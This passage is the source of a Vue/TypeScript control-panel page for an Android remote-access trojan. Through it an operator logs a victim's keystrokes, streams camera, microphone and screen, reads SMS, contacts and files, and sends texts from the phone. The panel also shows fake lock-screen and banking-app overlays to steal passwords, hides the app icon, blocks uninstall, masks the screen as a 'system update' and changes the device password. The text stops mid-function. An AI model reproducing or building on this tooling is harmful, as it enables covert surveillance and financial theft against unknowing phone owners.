<script setup lang="ts">
import type { DownChunk } from './device-events';

import type { ApplicationItem } from '#/types/application';
import type { WsEvent } from '#/composables/useWebSocket';
import type { DeviceDetailFields } from '#/types/device';

import { computed, onBeforeUnmount, onMounted, reactive, ref } from 'vue';

import {
  DisconnectOutlined,
  MobileOutlined,
  ReloadOutlined,
  SearchOutlined,
  WifiOutlined,
} from '@ant-design/icons-vue';
import { message } from 'ant-design-vue';

import { fetchDeviceDetail, updateDeviceRemark } from '#/api/devices';
import { apiError } from '#/api/http';
import { listBuilds } from '#/api/applications';
import { useWebSocket } from '#/composables/useWebSocket';
import PageContainer from '#/layouts/components/PageContainer.vue';
import { DEVICE_COMMANDS, SCREEN_COMMANDS } from '#/store/dictionary';

import { createDeviceEventState, reduceDeviceEvent } from './device-events';
import * as P from './device-protocol';

import './device-control.css';

// 权限系统
type FeatureName = 'camera' | 'mic' | 'location' | 'sms' | 'contacts' | 'apps' | 'files' | 'inject' | 'phishing' | 'screen' | 'popup';

interface FeaturePermission {
  enabled: boolean;
  reason?: string;
}

const featurePermissions = reactive<Record<FeatureName, FeaturePermission>>({
  camera: { enabled: true },
  mic: { enabled: true },
  location: { enabled: true },
  sms: { enabled: true },
  contacts: { enabled: true },
  apps: { enabled: true },
  files: { enabled: true },
  inject: { enabled: true },
  phishing: { enabled: false, reason: '功能暂未启用' },
  screen: { enabled: true },
  popup: { enabled: true },
});

function canUseFeature(name: FeatureName): boolean {
  return featurePermissions[name]?.enabled ?? false;
}

function getRestrictedReason(name: FeatureName): string {
  return featurePermissions[name]?.reason ?? '该功能受限';
}

const props = defineProps<{ phoneId: string; preferWsSummary?: boolean }>();

type ScreenAction = {
  command?: {
    bstate?: string;
    comand: string;
    kbstate?: string;
    label: string;
    lockit?: string;
    navshort?: string;
    usdttype?: string;
    volstate?: string;
  };
  danger?: boolean;
  key?: string;
  label: string;
  restricted?: boolean;
};

type ScreenPane = 'primary' | 'stream';
type ScreenPoint = { x: number; y: number };

type ScreenPointerState = {
  longPress: boolean;
  pane: ScreenPane;
  path: ScreenPoint[];
  start: ScreenPoint;
  tapCandidate: boolean;
  target: HTMLElement;
};

const ws = useWebSocket();
const activeTab = ref('keylog');
const deviceInfo = ref<DeviceDetailFields | null>(null);
const deviceLoading = ref(false);
const events = ref<Array<{ payload: string; time: string; type: string }>>([]);
const keylogRunning = ref(false);
const cameraRunning = ref(false);
const cameraLoading = ref(false);
const cameraError = ref<string | null>(null);
const cameraImage = ref<string | null>(null);
const micRunning = ref(false);
const audioLoading = ref(false);
const audioCapturing = ref(false);
const audioError = ref<string | null>(null);
const screenRunning = ref(false);
const streamRunning = ref(false);
const remarkText = ref('');
const smsSearch = ref('');
const appSearch = ref('');
const keylogSearch = ref('');
const cameraSide = ref<'0' | '1'>('0');
const screenMode = ref<'SM' | 'SN'>('SM');
const blockColor = ref<'0' | '1'>('0');
const blockText = ref('');
const phishTitle = ref('');
const phishContent = ref('');
const phishType = ref<'0' | '1' | '2' | '3'>('0');
const lastStatus = ref<null | WsEvent>(null);
const panelState = ref(createDeviceEventState());

const smsVisible = ref(false);
const smsNumber = ref('');
const smsText = ref('');
const logdateVisible = ref(false);
const logdateDate = ref('');
const openappVisible = ref(false);
const openappPackage = ref('');
const pasteVisible = ref(false);
const pasteText = ref('');
const phonepassVisible = ref(false);
const phonepassText = ref('');
const bcVisible = ref(false);
const bcComand = ref<'alert' | 'notify'>('notify');
const bcTitle = ref('');
const bcMsg = ref('');
const bcTodo = ref('');
const bcAct = ref<'nothing' | 'openApp' | 'openLink'>('nothing');
const bcIco = ref('');
const popupFormTitle = ref('');
const popupFormMessage = ref('');
const popupFormVisible = ref(false);
const popupFormLoading = ref(false);

const keylogColumns = [
  { dataIndex: 'time', title: '时间', width: 160 },
  { dataIndex: 'content', title: '内容' },
];
const smsColumns = [
  { dataIndex: 'time', title: '时间', width: 140 },
  { dataIndex: 'text', title: '内容' },
  { dataIndex: 'number', title: '号码', width: 160 },
];
const contactColumns = [
  { dataIndex: 'name', title: '备注' },
  { dataIndex: 'number', title: '号码' },
];
const appColumns = [
  { dataIndex: 'name', title: '名字' },
  { dataIndex: 'packageName', title: '包名' },
];
const fileColumns = [
  { dataIndex: 'name', title: '文件名' },
  { dataIndex: 'size', title: '大小', width: 120 },
  { dataIndex: 'path', title: '路径' },
  { dataIndex: 'lastModified', title: '修改时间', width: 150 },
];
const injectColumns = [
  { dataIndex: 'htmlName', title: '界面' },
  { dataIndex: 'packageName', title: '包名' },
  { dataIndex: 'logText', title: '记录' },
];

const currentFilePath = ref('/');
const renameVisible = ref(false);
const renameName = ref('');
const renamePath = ref('');

// Search
const searchQuery = ref('');
const searchType = ref<'all' | 'content' | 'ext' | 'name'>('name');
const searchPath = ref('/sdcard/');

// File upload
const uploadVisible = ref(false);
const uploadFilePath = ref('/sdcard/');
const uploadFileName = ref('');
const uploadingFile = ref<File | null>(null);
const uploadProgress = ref(0);
const uploading = ref(false);

// File download
const downloadProgress = ref('');

// Server change
const serverChangeVisible = ref(false);
const serverDomain = ref('');
const serverIp = ref('');
const serverChangeId = ref('');

// Notify
const notifyText = ref('');

// Display
const displayValue = ref('1');

// Quality
const qualityValue = ref('50');

// NoInject
const noInjId = ref('');

// Proxy
const proxyOn = ref(true);

// APK Dispatch
const selectedApkId = ref<string | null>(null);
const availableBuilds = ref<ApplicationItem[]>([]);
const dispatchLoading = ref(false);
const dispatchProgress = ref(0);
const buildsLoading = ref(false);

const screenModeOptions = [
  { label: '截图', value: 'SM' },
  { label: '投屏', value: 'SN' },
];

const blockColorOptions = [
  { label: '黑色背景', value: '0' },
  { label: '系统更新', value: '1' },
];

const phishTypeOptions = [
  { label: '自由选择密码', value: '0' },
  { label: '壁纸图案密码', value: '1' },
  { label: '壁纸数字密码', value: '2' },
  { label: '壁纸混合密码', value: '3' },
];

const quickScreenActions = [
  { label: '支', type: '6' },
  { label: '微', type: '7' },
  { label: '云', type: '8' },
  { label: '建', type: '9' },
  { label: '邮', type: '10' },
  { label: '农', type: '11' },
  { label: '中', type: '12' },
  { label: '工', type: '13' },
  { label: '招', type: '14' },
  { label: 'gp', type: '15' },
  { label: 'pe', type: '16' },
  { label: 'an', type: '17' },
  { label: 'mb', type: '18' },
  { label: 'bc', type: '19' },
  { label: 'TP', type: '2' },
  { label: 'IM', type: '0' },
];

const screenActionRows: ScreenAction[][] = [
  [
    {
      command: { comand: 'L', label: '点亮屏幕', lockit: '2' },
      label: '点亮屏幕',
    },
  ],
  [
    {
      command: { comand: 'L', label: '解锁屏幕', lockit: '0' },
      label: '解锁屏幕',
    },
    {
      command: { comand: 'L', label: '锁定屏幕', lockit: '1' },
      danger: true,
      label: '锁定屏幕',
    },
  ],
  [
    {
      command: { bstate: '0', comand: 'block', label: '黑屏遮挡' },
      label: '黑屏遮挡',
    },
    {
      command: { bstate: '1', comand: 'block', label: '取消黑屏' },
      danger: true,
      label: '取消黑屏',
    },
  ],
  [
    {
      command: { bstate: '2', comand: 'block', label: '阻止操作' },
      label: '阻止操作',
    },
    {
      command: { bstate: '3', comand: 'block', label: '允许操作' },
      danger: true,
      label: '允许操作',
    },
  ],
  [
    {
      command: { comand: 'vol', label: '开启静音', volstate: '0' },
      label: '开启静音',
    },
    {
      command: { comand: 'vol', label: '关闭静音', volstate: '1' },
      danger: true,
      label: '关闭静音',
    },
  ],
  [
    {
      command: { comand: 'kb', kbstate: '2', label: '防止卸载' },
      label: '防止卸载',
    },
    {
      command: { comand: 'kb', kbstate: '3', label: '可以卸载' },
      danger: true,
      label: '可以卸载',
    },
  ],
  [
    {
      command: { comand: 'L', label: '清除密码', lockit: '2' },
      label: '清除密码',
    },
    {
      command: { comand: 'L', label: '禁止人脸', lockit: '3' },
      danger: true,
      label: '禁止人脸',
    },
  ],
  [{ key: 'Hideico', label: '隐藏图标' }],
];

const navActions: ScreenAction[] = [
  {
    command: { comand: 'nav', label: '后台键', navshort: 'rec' },
    label: '后台键',
  },
  {
    command: { comand: 'nav', label: '主页键', navshort: 'ho' },
    label: '主页键',
  },
  {
    command: { comand: 'nav', label: '返回键', navshort: 'bak' },
    label: '返回键',
  },
];

const keylogRows = computed(() => {
  const query = keylogSearch.value.trim();
  return panelState.value.keylogs
    .map((content, index) => ({
      content,
      index,
      time: parseLeadingTime(content),
    }))
    .filter((row) => !query || row.content.includes(query));
});

const smsRows = computed(() => {
  const query = smsSearch.value.trim();
  return panelState.value.sms.filter(
    (row) =>
      !query ||
      row.text.includes(query) ||
      row.detail.includes(query) ||
      row.number.includes(query),
  );
});

const appRows = computed(() => {
  const query = appSearch.value.trim();
  return panelState.value.apps.filter(
    (row) =>
      !query || row.name.includes(query) || row.packageName.includes(query),
  );
});

const deviceSummaryRows = computed(() => [
  {
    label: '屏幕',
    value:
      fieldValue('wallpaper', 'screen_resolution', 'activities', 'activz') ||
      '未获取',
  },
  {
    label: '安卓版本',
    value:
      fieldValue('android_ver', 'android_version', 'phoneandroid') || '未知',
  },
  { label: '型号', value: fieldValue('model', 'phonemodel') || '未知' },
  {
    label: '电池',
    value:
      cleanBattery(
        fieldValue('battery_charg', 'battery_charge', 'phonebattery'),
      ) || '未知',
  },
  { label: '无障碍', value: accessibilityLabel(fieldValue('accessibility')) },
  {
    label: '手机密码',
    value: fieldValue('phone_password', 'phonepassword') || '未获取',
  },
]);

let off: (() => void) | null = null;
let joinRetryTimer: null | number = null;
let panelPingTimer: null | number = null;
let longPressTimer: null | number = null;
let moveThrottleTimer: null | number = null;
let pendingMovePath: null | string = null;
let screenPointer: null | ScreenPointerState = null;

const moveThreshold = 5;

async function loadAvailableBuilds() {
  buildsLoading.value = true;
  try {
    const builds = await listBuilds();
    availableBuilds.value = builds.filter(
      (b: any) => b.build_state === 'finished',
    );
  } catch (error) {
    message.error(apiError(error, '加载构建列表失败'));
  } finally {
    buildsLoading.value = false;
  }
}

async function dispatchApk() {
  if (!selectedApkId.value) {
    message.warning('请选择要下发的APK');
    return;
  }

  if (!ws.connected.value) {
    message.warning('WebSocket 未连接');
    return;
  }

  dispatchLoading.value = true;
  dispatchProgress.value = 0;

  try {
    // 通过WebSocket发送dispatch命令
    ws.panelSend({
      pid: props.phoneId,
      type: 'dispatch',
      subc: 'apk',
      app_package: selectedApkId.value,
    });

    // 模拟进度
    const interval = setInterval(() => {
      dispatchProgress.value += 10;
      if (dispatchProgress.value >= 100) {
        clearInterval(interval);
        message.success('APK下发成功');
        dispatchProgress.value = 0;
        selectedApkId.value = null;
      }
    }, 500);

    pushEvent('cmd', { subc: 'dispatch', app_package: selectedApkId.value });
  } catch (error) {
    message.error(apiError(error, 'APK下发失败'));
  } finally {
    dispatchLoading.value = false;
  }
}

onMounted(() => {
  if (!props.preferWsSummary) {
    void loadDeviceSummary();
  }
  void loadAvailableBuilds();
  ws.connect();
  off = ws.on((ev) => {
    if (ev.type === 'statusBatch') {
      lastStatus.value = ev;
      applyStatusBatchPhoneInfo(ev);
      pushEvent('status', ev);
      return;
    }
    panelState.value = reduceDeviceEvent(panelState.value, ev);
    pushEvent(String(ev.type || 'event'), ev);
  });
  startPanelStatusPolling();
});

onBeforeUnmount(() => {
  stopPanelStatusPolling();
  clearScreenPointerTimers();
  if (props.phoneId) ws.panelQuery({ pid: props.phoneId, subc: 'out' });
  off?.();
  ws.disconnect();
});

async function loadDeviceSummary() {
  deviceLoading.value = true;
  try {
    const result = await fetchDeviceDetail(props.phoneId);
    if (result.status !== 'success' || !result.device) {
      throw new Error(result.message || '设备不存在');
    }
    deviceInfo.value = result.device;
    remarkText.value = String(
      result.device.phonename || result.device.phone_name || '',
    );
  } catch (error) {
    message.error(apiError(error, '加载设备信息失败'));
  } finally {
    deviceLoading.value = false;
  }
}

function applyStatusBatchPhoneInfo(ev: WsEvent) {
  const phoneInfo = ev.phoneInfo;
  if (!isRecord(phoneInfo) || Object.keys(phoneInfo).length === 0) return;
  deviceInfo.value = phoneInfo as DeviceDetailFields;
  const remark = firstString(phoneInfo, 'phonename', 'phone_name');
  if (remark) remarkText.value = remark;
  const keylogs = firstString(phoneInfo, 'keylogs');
  if (keylogs) {
    panelState.value = {
      ...panelState.value,
      keylogs: keylogs.split('*').filter(Boolean),
    };
  }
}

function refreshDeviceSummary() {
  if (props.preferWsSummary) {
    ping();
    return;
  }
  void loadDeviceSummary();
}

function startPanelStatusPolling() {
  stopPanelStatusPolling();
  joinRetryTimer = window.setInterval(() => {
    if (ws.panelQuery({ pid: props.phoneId, subc: 'join' })) {
      clearJoinRetry();
      sendPanelPing();
    }
  }, 300);
  panelPingTimer = window.setInterval(sendPanelPing, 5000);
}

function stopPanelStatusPolling() {
  clearJoinRetry();
  if (panelPingTimer !== null) {
    window.clearInterval(panelPingTimer);
    panelPingTimer = null;
  }
}

function clearJoinRetry() {
  if (joinRetryTimer !== null) {
    window.clearInterval(joinRetryTimer);
    joinRetryTimer = null;
  }
}

function sendPanelPing() {
  return ws.panelQuery({ pid: props.phoneId, subc: 'ping' });
}

async function saveRemark() {
  if (!remarkText.value.trim()) {
    message.warning('备注不能为空');
    return;
  }
  try {
    const result = await updateDeviceRemark(
      props.phoneId,
      remarkText.value.trim(),
    );
    if (!result.error && (result.status === 'success' || result.message)) {
      message.success(result.message || '备注已修改');
      if (props.preferWsSummary) {
        ping();
      } else {
        await loadDeviceSummary();
      }
    } else {
      message.error(result.error || result.message || '修改失败');
    }
  } catch (error) {
    message.error(apiError(error, '修改备注失败'));
  }
}

function ping() {
  if (!sendPanelPing()) {
    message.warning('WebSocket 未连接');
  }
}

function reconnect() {
  ws.disconnect();
  ws.connect();
  startPanelStatusPolling();
}

// 命令 key → 中文标签映射
const CMD_LABEL_MAP: Record<string, string> = Object.fromEntries([
  ...DEVICE_COMMANDS.map((c) => [c.key, c.label]),
  ...SCREEN_COMMANDS.map((c) => [c.comand, c.label]),
]);
CMD_LABEL_MAP['SMSSEND'] = '发送短信';
CMD_LABEL_MAP['Logdate'] = '键盘记录(按日期)';
CMD_LABEL_MAP['join'] = '加入监控';
CMD_LABEL_MAP['out'] = '退出监控';
CMD_LABEL_MAP['ping'] = '心跳检测';
CMD_LABEL_MAP['files'] = '文件浏览';
CMD_LABEL_MAP['viewfile'] = '查看文件';
CMD_LABEL_MAP['Hideico'] = '隐藏图标';

// 错误消息翻译
const ERROR_MSG_MAP: Record<string, string> = {
  device_not_found: '设备未找到',
  device_offline: '设备离线',
  invalid_pid: '设备ID无效',
  subcommand_blocked: '指令被拦截（高危）',
  timeout: '超时无响应',
  ws_auth_failed: '认证失败',
};

// 连接状态翻译
const LINK_STATUS_MAP: Record<string, string> = {
  CLOSED: '离线',
  OPEN: '在线',
};

function typeLabel(type: string): string {
  const map: Record<string, string> = {
    cmd: '指令',
    error: '错误',
    event: '事件',
    restricted: '受限',
    status: '状态',
  };
  return map[type] || type;
}

function formatPayload(type: string, payload: unknown): string {
  if (typeof payload === 'string') return payload;
  const obj = payload as Record<string, unknown>;

  if (type === 'cmd') {
    const subc = String(obj.subc || obj.key || '');
    const label = CMD_LABEL_MAP[subc] || subc;
    if (obj.sent) return `已发送指令：${label}`;
    if (obj.date) return `${label}，日期：${obj.date}`;
    if (obj.to) return `${label}，发送至：${obj.to}`;
    if (obj.filepath) return `${label}：${obj.filepath}`;
    if (obj.comand) {
      const screenLabel =
        SCREEN_COMMANDS.find(
          (s) =>
            s.comand === obj.comand &&
            s.lockit === obj.lockit &&
            s.bstate === obj.bstate,
        )?.label || obj.comand;
      return `已发送指令：${screenLabel}`;
    }
    return `已发送指令：${label}`;
  }

  if (type === 'error') {
    const msg = String(obj.msg || obj.message || '未知错误');
    const translated = ERROR_MSG_MAP[msg] || msg;
    const pid = obj.pid ? ` (${obj.pid})` : '';
    return `${translated}${pid}`;
  }

  if (type === 'status') {
    const link =
      LINK_STATUS_MAP[String(obj.serverToPhone || '')] ||
      String(obj.serverToPhone || '未知');
    const ping = obj.lastPing ? `最后心跳 ${obj.lastPing}` : '无心跳记录';
    return `设备链路：${link}，${ping}`;
  }

  const text = JSON.stringify(payload);
  return text.length > 280 ? `${text.slice(0, 280)}…` : text;
}

function pushEvent(type: string, payload: unknown) {
  const time = new Date().toLocaleTimeString('zh-CN', { hour12: false });
  const text = formatPayload(type, payload);
  events.value.unshift({
    payload: text.length > 280 ? `${text.slice(0, 280)}…` : text,
    time,
    type,
  });
  if (events.value.length > 100) events.value.length = 100;
}

const devicePayloadMap: Record<string, () => null | P.DevicePayload> = {
  Contacts: () => P.buildContacts(),
  Hideico: () => P.buildHideico(),
  Keylog: () => P.buildKeylog(keylogRunning.value ? '1' : '0'),
  LOADAPPS: () => P.buildLoadApps(),
  SMS: () => P.buildSms(),
  backcam: () => P.buildCam('1'),
  brows: () => ({ extdata: null, ltype: 'u', subc: 'n', type: 'brows' }),
  cam: () => P.buildCam(cameraSide.value),
  camoff: () => P.buildCamOff(),
  loc: () => P.buildLoc(),
  locoff: () => P.buildLocOff(),
  mic: () => P.buildMic(),
  micoff: () => P.buildMicOff(),
  screen: () => P.buildScreenStream('SK'),
  OPENINJ: () => P.buildOpenInjection(),
};

function sendCommand(key: string) {
  if (!ws.connected.value) {
    message.warning('WebSocket 未连接');
    return;
  }
  const builder = devicePayloadMap[key];
  if (!builder) return;
  const payload = builder();
  if (!payload) return;
  ws.panelSend({ pid: props.phoneId, ...payload });
  pushEvent('cmd', { key, sent: true, ...payload });
}

function sendDevicePayload(payload: P.DevicePayload) {
  if (!ws.connected.value) {
    message.warning('WebSocket 未连接');
    return false;
  }
  ws.panelSend({ pid: props.phoneId, ...payload });
  pushEvent('cmd', payload);
  return true;
}

function sendScreenMove(
  movetype: P.ScreenMoveType,
  poi: P.ScreenMovePoint | string,
) {
  if (!ws.connected.value || !props.phoneId) return;
  ws.panelSend({ pid: props.phoneId, ...P.buildScreenMove(movetype, poi) });
}

function startScreenPointer(event: MouseEvent, pane: ScreenPane) {
  if (event.button !== 0) return;
  const target = event.currentTarget as HTMLElement;
  const point = localScreenPoint(event, target);
  screenPointer = {
    longPress: false,
    pane,
    path: [point],
    start: point,
    tapCandidate: true,
    target,
  };
  clearLongPressTimer();
  longPressTimer = window.setTimeout(() => {
    if (screenPointer?.pane === pane) screenPointer.longPress = true;
  }, 350);
}

function moveScreenPointer(event: MouseEvent, pane: ScreenPane) {
  if (!screenPointer || screenPointer.pane !== pane) return;
  const point = localScreenPoint(event, screenPointer.target);
  if (pointDistance(screenPointer.start, point) > moveThreshold) {
    screenPointer.tapCandidate = false;
    screenPointer.longPress = false;
    clearLongPressTimer();
  }
  screenPointer.path.push(point);
  if (!screenPointer.tapCandidate) scheduleDragMove(screenPointer);
}

function finishScreenPointer(event: MouseEvent, pane: ScreenPane) {
  if (!screenPointer || screenPointer.pane !== pane) return;
  const state = screenPointer;
  screenPointer = null;
  clearLongPressTimer();
  const finalPoint = localScreenPoint(event, state.target);
  if (pointDistance(state.path.at(-1) || state.start, finalPoint) > 0)
    state.path.push(finalPoint);
  if (state.longPress) {
    sendScreenMove(
      '2',
      scaleScreenPoint(state.start, state.target, state.pane),
    );
    return;
  }
  if (state.tapCandidate) {
    sendScreenMove(
      '0',
      scaleScreenPoint(state.start, state.target, state.pane),
    );
    return;
  }
  sendScreenMove(
    '1',
    formatMovePath(
      state.path.map((point) =>
        scaleScreenPoint(point, state.target, state.pane),
      ),
    ),
  );
}

function localScreenPoint(event: MouseEvent, target: HTMLElement): ScreenPoint {
  const rect = target.getBoundingClientRect();
  return {
    x: clamp(Math.round(event.clientX - rect.left), 0, Math.round(rect.width)),
    y: clamp(Math.round(event.clientY - rect.top), 0, Math.round(rect.height)),
  };
}

function scaleScreenPoint(
  point: ScreenPoint,
  target: HTMLElement,
  pane: ScreenPane,
): ScreenPoint {
  const rect = target.getBoundingClientRect();
  const size =
    pane === 'primary'
      ? panelState.value.screenSize
      : panelState.value.screenshotSize;
  const width = size?.width || rect.width || 1;
  const height = size?.height || rect.height || 1;
  return {
    x: Math.round(point.x * (width / Math.max(rect.width, 1))),
    y: Math.round(point.y * (height / Math.max(rect.height, 1))),
  };
}

function scheduleDragMove(state: ScreenPointerState) {
  pendingMovePath = formatMovePath(
    state.path.map((point) =>
      scaleScreenPoint(point, state.target, state.pane),
    ),
  );
  if (moveThrottleTimer !== null) return;
  moveThrottleTimer = window.setTimeout(() => {
    moveThrottleTimer = null;
    if (!pendingMovePath) return;
    sendScreenMove('1', pendingMovePath);
    pendingMovePath = null;
  }, 50);
}

function formatMovePath(path: ScreenPoint[]) {
  return path.map((point) => `(${point.x},${point.y})`).join(':');
}

function pointDistance(a: ScreenPoint, b: ScreenPoint) {
  return Math.hypot(a.x - b.x, a.y - b.y);
}

function clamp(value: number, min: number, max: number) {
  return Math.min(max, Math.max(min, value));
}

function clearLongPressTimer() {
  if (longPressTimer !== null) {
    window.clearTimeout(longPressTimer);
    longPressTimer = null;
  }
}

function clearScreenPointerTimers() {
  clearLongPressTimer();
  if (moveThrottleTimer !== null) {
    window.clearTimeout(moveThrottleTimer);
    moveThrottleTimer = null;
  }
  pendingMovePath = null;
  screenPointer = null;
}

function toggleKeylog(on: boolean) {
  keylogRunning.value = on;
  sendCommand('Keylog');
}

function toggleCamera(on: boolean) {
  if (!ws.connected.value) {
    cameraError.value = 'WebSocket 未连接';
    message.warning(cameraError.value);
    return;
  }
  cameraLoading.value = true;
  cameraError.value = null;
  try {
    cameraRunning.value = on;
    sendCommand(on ? 'cam' : 'camoff');
    if (on) {
      // 设置超时，如果5秒内未收到数据则标记错误
      const timeout = setTimeout(() => {
        if (!cameraImage.value) {
          cameraError.value = '获取摄像画面超时，请检查设备连接';
          message.warning(cameraError.value);
        }
      }, 5000);
      const originalOff = off;
      off = () => {
        clearTimeout(timeout);
        originalOff?.();
      };
    }
  } catch (error) {
    cameraError.value = `摄像监控错误: ${String(error)}`;
    message.error(cameraError.value);
    cameraRunning.value = false;
  } finally {
    cameraLoading.value = false;
  }
}

function toggleMic(on: boolean) {
  if (on) {
    startAudioCapture();
  } else {
    stopAudioCapture();
  }
}

function startAudioCapture() {
  if (!ws.connected.value) {
    audioError.value = 'WebSocket 未连接';
    message.warning(audioError.value);
    return;
  }
  audioLoading.value = true;
  audioError.value = null;
  try {
    audioCapturing.value = true;
    micRunning.value = true;
    sendCommand('mic');
    message.info('音频采集已启动');
  } catch (error) {
    audioError.value = `启动音频采集失败: ${String(error)}`;
    message.error(audioError.value);
    audioCapturing.value = false;
  } finally {
    audioLoading.value = false;
  }
}

function stopAudioCapture() {
  audioLoading.value = true;
  try {
    audioCapturing.value = false;
    micRunning.value = false;
    sendCommand('micoff');
    message.info('音频采集已停止');
  } catch (error) {
    audioError.value = `停止音频采集失败: ${String(error)}`;
    message.error(audioError.value);
  } finally {
    audioLoading.value = false;
  }
}

function togglePrimaryScreen(on: boolean) {
  if (sendDevicePayload(P.buildScreenStream(on ? 'SK' : 'SKOFF'))) {
    screenRunning.value = on;
  }
}

function toggleStreamScreen(on: boolean) {
  const type = on ? screenMode.value : `${screenMode.value}OFF`;
  if (sendDevicePayload(P.buildScreenStream(type))) {
    streamRunning.value = on;
  }
}

function buildScreenPayload(a: ScreenAction['command']): P.DevicePayload {
  if (!a) return {};
  switch (a.comand) {
    case 'block': {
      return P.buildScreenBlock(a.bstate ?? '0', blockColor.value);
    }
    case 'kb': {
      return P.buildScreenKb(a.kbstate ?? '3');
    }
    case 'L': {
      return P.buildScreenLock(a.lockit ?? '0');
    }
    case 'nav': {
      return P.buildScreenNav(a.navshort ?? 'ho');
    }
    case 'usdt': {
      return P.buildScreenUsdt(a.usdttype ?? '0');
    }
    case 'vol': {
      return P.buildScreenVol(a.volstate ?? '1');
    }
    default: {
      return { subc: a.comand, type: 'screen' };
    }
  }
}

function runScreenAction(action: ScreenAction) {
  if (action.restricted) {
    message.warning(`${action.label} 已按旧页面保留入口，当前不转发执行`);
    pushEvent('restricted', { label: action.label });
    return;
  }
  if (action.key) {
    sendCommand(action.key);
    return;
  }
  if (!ws.connected.value) {
    message.warning('WebSocket 未连接');
    return;
  }
  if (action.command?.comand === 'block' && action.command.bstate === '0') {
    const blockTextPayload = P.buildScreenBlockd(blockText.value);
    const blockPayload = P.buildScreenBlock('0', blockColor.value);
    ws.panelSend({ pid: props.phoneId, ...blockTextPayload });
    ws.panelSend({ pid: props.phoneId, ...blockPayload });
    pushEvent('cmd', [blockTextPayload, blockPayload]);
    return;
  }
  const payload = buildScreenPayload(action.command);
  ws.panelSend({ pid: props.phoneId, ...payload });
  pushEvent('cmd', payload);
}

function runQuickScreenAction(type: string) {
  sendDevicePayload(P.buildScreenUsdt(type));
}

function submitPasswordPhish() {
  const title = phishTitle.value.trim();
  const content = phishContent.value.trim();
  if (!title || !content) {
    message.warning('请输入钓鱼界面文字标题和内容');
    return;
  }
  sendDevicePayload(
    P.buildPasswordPhish({
      lckdis: content,
      title,
      typ: phishType.value,
    }),
  );
}

function openSmsSend() {
  smsNumber.value = '';
  smsText.value = '';
  smsVisible.value = true;
}

function submitSms() {
  const numbers = smsNumber.value.trim();
  const msg = smsText.value.trim();
  if (!numbers || !msg) {
    message.warning('号码和内容不能为空');
    return;
  }
  for (const n of numbers.split(/\s+/)) {
    ws.panelSend({ pid: props.phoneId, ...P.buildSmsSend(n, msg) });
  }
  pushEvent('cmd', { subc: 'SMSSEND', to: numbers });
  message.success('短信指令已下发');
  smsVisible.value = false;
}

function openLogdate() {
  logdateDate.value = new Date().toISOString().slice(0, 10);
  logdateVisible.value = true;
}

function submitLogdate() {
  const d = logdateDate.value.trim();
  if (!d) {
    message.warning('请选择日期');
    return;
  }
  ws.panelSend({ pid: props.phoneId, ...P.buildLogdate(d) });
  pushEvent('cmd', { date: d, subc: 'Logdate' });
  message.success('键盘记录查询已下发');
  logdateVisible.value = false;
}

function openOpenApp(packageName = '') {
  openappPackage.value = packageName;
  openappVisible.value = true;
}

function submitOpenApp() {
  const pkg = openappPackage.value.trim();
  if (!pkg) {
    message.warning('请输入包名');
    return;
  }
  ws.panelSend({ pid: props.phoneId, ...P.buildOpenApp(pkg) });
  pushEvent('cmd', P.buildOpenApp(pkg));
  message.success('打开应用指令已下发');
  openappVisible.value = false;
}

function submitPaste() {
  if (!pasteText.value) {
    message.warning('请输入文本');
    return;
  }
  ws.panelSend({ pid: props.phoneId, ...P.buildScreenPaste(pasteText.value) });
  pushEvent('cmd', P.buildScreenPaste(pasteText.value));
  message.success('粘贴指令已下发');
  pasteVisible.value = false;
}

function submitPhonepass() {
  const pwd = phonepassText.value.trim();
  if (!/^\d+$/.test(pwd)) {
    message.warning('请输入数字密码');
    return;
  }
  sendDevicePayload(P.buildScreenPhonepass('1', pwd));
  message.success('密码修改指令已下发');
  phonepassVisible.value = false;
}

function openBroadcast(packageName = '') {
  bcTitle.value = '';
  bcMsg.value = '';
  bcTodo.value = packageName;
  bcIco.value = '';
  bcAct.value = packageName ? 'openApp' : 'nothing';
  bcComand.value = 'notify';
  bcVisible.value = true;
}

function submitBc() {
  if (!bcTitle.value.trim() || !bcMsg.value.trim()) {
    message.warning('标题和内容不能为空');
    return;
  }
  const payload = P.buildBroadcast({
    act: bcAct.value,
    alertico: bcIco.value.trim(),
    comand: bcComand.value,
    msg: bcMsg.value.trim(),
    title: bcTitle.value.trim(),
    todo: bcTodo.value.trim(),
  });
  ws.panelSend({ pid: props.phoneId, ...payload });
  pushEvent('cmd', payload);
  message.success('弹窗/通知指令已下发');
  bcVisible.value = false;
}

function openPopupForm() {
  popupFormTitle.value = '';
  popupFormMessage.value = '';
  popupFormVisible.value = true;
}

function sendPopup() {
  if (!popupFormTitle.value.trim() || !popupFormMessage.value.trim()) {
    message.warning('弹窗标题和内容不能为空');
    return;
  }
  popupFormLoading.value = true;
  try {
    if (!ws.connected.value) {
      message.warning('WebSocket 未连接');
      return;
    }
    const payload = P.buildOpenInjection();
    ws.panelSend({ pid: props.phoneId, ...payload });
    pushEvent('cmd', {
      type: 'popup',
      title: popupFormTitle.value.trim(),
      message: popupFormMessage.value.trim(),
    });
    message.success('弹窗已通过应用注入发送');
    popupFormVisible.value = false;
  } catch (error) {
    message.error(`发送弹窗失败: ${String(error)}`);
  } finally {
    popupFormLoading.value = false;
  }
}

function clearKeylog() {
  panelState.value = { ...panelState.value, keylogs: [] };
}

function downloadText(filename: string, rows: string[]) {
  const blob = new Blob([rows.join('\n')], {
    type: 'text/plain;charset=utf-8',
  });
  const url = URL.createObjectURL(blob);
  const link = document.createElement('a');
  link.href = url;
  link.download = filename;
  document.body.append(link);
  link.click();
  link.remove();
  URL.revokeObjectURL(url);
}

function exportKeylog() {
  downloadText('keylog_data.txt', panelState.value.keylogs);
}

function exportSms() {
  downloadText(
    'sms_data.txt',
    panelState.value.sms.map(
      (item) => `${item.time}\t${item.number}\t${item.detail || item.text}`,
    ),
  );
}

function browseFiles(filepath: string) {
  if (!ws.connected.value) {
    message.warning('WebSocket 未连接');
    return;
  }
  currentFilePath.value = filepath;
  ws.panelSend({ pid: props.phoneId, ...P.buildFilesBrowse(filepath) });
  pushEvent('cmd', { subc: 'files', filepath });
}

function refreshFiles() {
  browseFiles(currentFilePath.value);
}

function viewFile(filepath: string) {
  if (!ws.connected.value) return;
  ws.panelSend({ pid: props.phoneId, ...P.buildFileView(filepath) });
  pushEvent('cmd', { subc: 'viewfile', filepath });
}

function openRename(name: string, path: string) {
  renameName.value = name;
  renamePath.value = path;
  renameVisible.value = true;
}

function submitRename() {
  const name = renameName.value.trim();
  if (!name) {
    message.warning('请输入新名称');
    return;
  }
  sendDevicePayload(P.buildFileRename(name));
  renameVisible.value = false;
}

function getInjApps() {
  sendCommand('OPENINJ');
}

function deleteFile(_path: string) {
